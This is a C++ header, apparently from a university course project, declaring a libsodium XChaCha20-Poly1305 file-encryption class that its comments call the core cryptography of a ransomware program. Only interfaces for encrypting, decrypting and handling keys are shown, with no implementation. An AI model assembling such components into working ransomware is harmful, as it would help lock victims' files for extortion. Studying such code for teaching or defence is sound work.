#pragma once

#include <array>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sodium.h>
#include <string>
#include "elbeecrypt/common/utils/container.hpp"
#include "elbeecrypt/common/utils/stream.hpp"

namespace fs = std::filesystem;

namespace elbeecrypt::common::io {
	/**
	 * @brief Contains the main cryptography logic for the ransomware.
	 * This engine uses LibSodium to achieve the cryptography functionality.
	 * This class wraps all the complexity behind an easy to use interface,
	 * including handling the key, nonces, etc. The core of the encryption
	 * and decryption logic of this class is based around LibSodium's Secret
	 * Stream API. This API utilizes a stream cipher to encrypt and decrypt
	 * a file that is loaded into memory in chunks. The actual logic to handle
	 * the process (generating nonces, adding MAC padding, etc) is seamlessly
	 * handled by LibSodium and allows the stream cipher to work to the best
	 * of its ability. The cipher and authentication mode is as follows:
	 * XChaCha20-Poly1305
	 * The reason is because ChaCha20-Poly1305, and by extension, the X variant,
	 * unlike AES-GCM, is not vulnerable to timing attacks and runs 3x faster
	 * in software. Sources:
	 * https://github.com/jedisct1/libsodium-doc/blob/master/secret-key_cryptography/aead.md
	 * 
	 * The relevant LibSodium documentation can be found
	 * here: https://doc.libsodium.org/secret-key_cryptography/secretstream#file-encryption-example-code
	 * A password-based approach to this problem can be found
	 * here: https://github.com/jpiechowka/libsodium-file-crypter
	 * 
	 * @author CECS-378 Group 10
	 * @file cryptor-engine.hpp
	 */
	class CryptorEngine {
		//Enum constants
		public:
			/** An enum outlining the status of an operation performed by methods of this class. */
			enum Status : int {
				/** The operation in question completed successfully. */
				OK = 0,

				/** The operation in question failed. */
				FAIL = -1
			};


		//Non-enum public constants
		public:
			/** The ciphersuite that this class uses. This is for metadata purposes. */
			const static std::string CIPHER_ALGO;

			/** The key type that this class uses. This is for metadata purposes. */
			const static std::string KEY_TYPE;

			/** The size of the key in bytes. This is an alias of `crypto_secretstream_xchacha20poly1305_KEYBYTES`. */
			constexpr static uint8_t KEY_SIZE = crypto_secretstream_xchacha20poly1305_KEYBYTES;


		//Non-enum private constants
		private:
			/** The default size of the plaintext buffer (128 KB). */
			constexpr static uint32_t DEFAULT_PT_BUF_SIZE = 131100;

			/** The size of the internal header buffer that is prepended to encrypted file chunks. This is an alias of `crypto_secretstream_xchacha20poly1305_HEADERBYTES`. */
			constexpr static uint8_t H_BUF_SIZE = crypto_secretstream_xchacha20poly1305_HEADERBYTES;


		//Fields
		private:
			/** The key to use in the encryption and decryption operations. Keep this key safe! */
			std::array<uint8_t, KEY_SIZE> key;

			/** The size of each chunk in bytes. */
			const uint32_t _chunkSize;

			/** The size of each ciphered chunk in bytes. The value of this variable will always be `chunkSize + crypto_secretstream_xchacha20poly1305_ABYTES`. */
			const uint32_t cipheredChunkSize;


		//Constructors & Destructor
		public:
			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * given symmetric key and a defined chunk size of x bytes. 
			 * Throws a `runtime_error` if LibSodium fails to initializeKB
			 * or the keygen operation failed.
			 * 
			 * @param skey The symmetric key to use
			 * @param chunkSize The size of each chunk in bytes
			 * @throws std::runtime_error If LibSodium failed to initialize or a keygen error occurred
			 */
			CryptorEngine(const std::array<uint8_t, KEY_SIZE>& skey, const uint32_t& chunkSize); //Constructor 1a: key by array

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * given symmetric key and the default chunk size of 128
			 * kilobytes. Throws a `runtime_error` if LibSodium fails 
			 * to initialize or the keygen operation failed.
			 * 
			 * @param skey The symmetric key to use
			 * @throws std::runtime_error If LibSodium failed to initialize or a keygen error occurred
			 */
			CryptorEngine(const std::array<uint8_t, KEY_SIZE>& skey); //Constructor 1b: key by array

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * given symmetric key and a defined chunk size of x bytes. 
			 * Throws a `runtime_error` if LibSodium fails to initialize,
			 * the symmetric key could not be loaded, the symmetric key
			 * format is invalid, or the keygen operation failed.
			 * 
			 * @param keyPath The path to the symmetric key to use. Must be a raw binary file
			 * @param chunkSize The size of each chunk in bytes
			 * @throws std::runtime_error If LibSodium failed to initialize, the
			 * symmetric key could not be loaded, or the symmetric key format is invalid
			 */
			CryptorEngine(const fs::path& keyPath, const uint32_t& chunkSize); //Constructor 2a: key by path

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * given symmetric key and the default chunk size of 128
			 * kilobytes Throws a `runtime_error` if LibSodium fails 
			 * to initialize, the symmetric key could not be loaded, 
			 * the symmetric key format is invalid, or the keygen operation 
			 * failed.
			 * 
			 * @param keyPath The path to the symmetric key to use. Must be a raw binary file
			 * @param chunkSize The size of each chunk in bytes
			 * @throws std::runtime_error If LibSodium failed to initialize, the
			 * symmetric key could not be loaded, or the symmetric key format is invalid
			 */
			CryptorEngine(const fs::path& keyPath); //Constructor 2b: key by path

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * random symmetric key. and a defined chunk size of x
			 * bytes. Throws a `runtime_error` if LibSodium fails
			 * to initialize or the keygen operation failed.
			 * 
			 * @param chunkSize The size of each chunk in bytes
			 * @throws std::runtime_error If LibSodium failed to initialize
			 */
			CryptorEngine(const uint32_t& chunkSize); //Constructor 3a: random key

			/**
			 * @brief Constructs a new CryptorEngine object with a
			 * random symmetric key. and the default chunk size of
			 * 128 kilobytes. Throws a `runtime_error` if LibSodium
			 * fails to initialize or the keygen operation failed.
			 * 
			 * @throws std::runtime_error If LibSodium failed to initialize
			 */
			CryptorEngine(); //Constructor 3b: random key

			/**
			 * @brief Destroys the CryptorEngineHuge object and securely 
			 * erases the key used by zeroing it out. This is done for
			 * security reasons. See why here: https://libsodium.gitbook.io/doc/memory_management
			 */
			~CryptorEngine();


		//Getters
		public:
			/**
			 * @brief Gets the symmetric key that this class will 
			 * use for encryption and decryption operations. Keep
			 * in mind that this is a sensitive key. Care must be
			 * taken when handling it. Additionally, when the
			 * destructor of this object is called, this key will
			 * be destroyed too, as this getter returns a constant
			 * reference to it.
			 * 
			 * @return An immutable reference to the symmetric key
			 */
			const std::array<uint8_t, KEY_SIZE>& getKey() const;

			/**
			 * @brief Gets the size of each chunk in bytes.
			 * 
			 * @return The size of each chunk in bytes
			 */
			uint32_t getChunkSize();

			/**
			 * @brief Gets the size of each ciphered chunk in bytes.
			 * 
			 * @return The size of each ciphered chunk in bytes
			 */
			uint32_t getCipheredChunkSize();


		//Methods
		public:
			/**
			 * @brief Decrypts a file using LibSodium's secret stream API. Keep
			 * in mind that this method does not modify the source file. It must
			 * be dealt with separately.
			 * 
			 * @param src The path of the file to decrypt
			 * @param dest The path of the decrypted file
			 * @return The result of the operation. See `CryptorEngine::Status`
			 */
			Status decryptFile(const fs::path& src, const fs::path& dest);

			/**
			 * @brief Encrypts a file using LibSodium's secret stream API. Keep
			 * in mind that this method does not modify the source file. It must
			 * be dealt with separately.
			 * 
			 * @param src The path of the file to encrypt
			 * @param dest The path of the encrypted file
			 * @return The result of the operation. See `CryptorEngine::Status`
			 */
			Status encryptFile(const fs::path& src, const fs::path& dest);

			/**
			 * @brief Exports the symmetric key to a file at the given path.
			 * 
			 * @param dest The file to write the key to
			 * @return Whether the operation completed successfully
			 */
			bool exportKey(const fs::path& dest);

			/**
			 * @brief Gets the SHA-256 fingerprint of the symmetric key.
			 * 
			 * @return The SHA-256 fingerprint of the symmetric key
			 */
			std::string keyFingerprint();

			/**
			 * @brief Returns the string representation of this object.
			 * 
			 * @return The string representation of this object
			 */
			std::string toString();


		//Operator overloads
		public:
			/**
			 * @brief Returns the string representation of this object. 
			 * Also allows for implicit string casting. 
			 * 
			 * @return The string representation of this object
			 */
			operator std::string();


		//Utility functions
		public:
			/**
			 * @brief Exports a key to a file at the given path.
			 * 
			 * @tparam size The size of the key array
			 * @param key The key array to export
			 * @param dest The file to write the key to
			 * @return Whether the operation completed successfully
			 */
			static bool exportKey(const std::array<uint8_t, KEY_SIZE>& key, const fs::path& dest);

			/**
			 * @brief Generates the SHA-256 fingerprint of a given key. See
			 * https://libsodium.gitbook.io/doc/advanced/sha-2_hash_function
			 * 
			 * @param key The key array to digest
			 * @return The SHA-256 representation of the key
			 */
			static std::string fingerprint(const std::array<uint8_t, KEY_SIZE>& key);

			/**
			 * @brief Imports a key from a file at the given path.
			 * 
			 * @param dest The file to import the key from
			 * @return An array containing the imported key
			 * @throws std::runtime_error If there was an issue importing the key or the size is wrong
			 */
			static std::array<uint8_t, KEY_SIZE> importKey(const fs::path& src);


		//Private utility functions
		private:
			/**
			 * @brief Calculates the size of ciphered chunk array using a given
			 * chunk size. This value will be the sum of `chunkSize` and
			 * `crypto_secretstream_xchacha20poly1305_ABYTES`.
			 * 
			 * @param chunkSize The size of each chunk in bytes
			 * @return The size of the ciphered chunk array
			 */
			static uint32_t calculateCipheredChunkSize(const uint32_t& chunkSize);

			/**
			 * @brief Closes the two `fstream` objects and all buffers used in 
			 * an encryption or decryption operation.
			 * 
			 * @param in The input fstream object
			 * @param out The output fstream object
			 * @param bufferA The first buffer to deallocate
			 * @param bufferB The second buffer to deallocate
			 * @param bufferC The third buffer to deallocate
			 */
			static void cleanup(std::ifstream& in, std::ofstream& out, uint8_t* bufferA, uint8_t* bufferB, uint8_t* bufferC);

			/**
			 * @brief Initializes LibSodium to ensure safe usage of its
			 * features. See https://libsodium.gitbook.io/doc/usage
			 * 
			 * @throws std::runtime_error If LibSodium failed to initialize
			 */
			static void init();

			/**
			 * @brief Locks the memory location in which the symmetric key
			 * is kept. This ensures that the key is not written to the disk's
			 * swap partition. This is done for security reasons. See why here:
			 * https://libsodium.gitbook.io/doc/memory_management
			 * 
			 * @param key The key to lock the location of
			 * @throws std::runtime_error If the memory location could not be locked
			 */
			static void lockKeyMem(std::array<uint8_t, KEY_SIZE>& key);

			/**
			 * @brief Unlocks the memory location in which the symmetric key
			 * is kept. This frees the space up in memory where the key was
			 * previously held. This is done for security reasons. See why
			 * here: https://libsodium.gitbook.io/doc/memory_management
			 * 
			 * @param key The key to unlock the location of
			 * @throws std::runtime_error If the memory location could not be unlocked
			 */
			static void unlockKeyMem(std::array<uint8_t, KEY_SIZE>& key);
	};
}
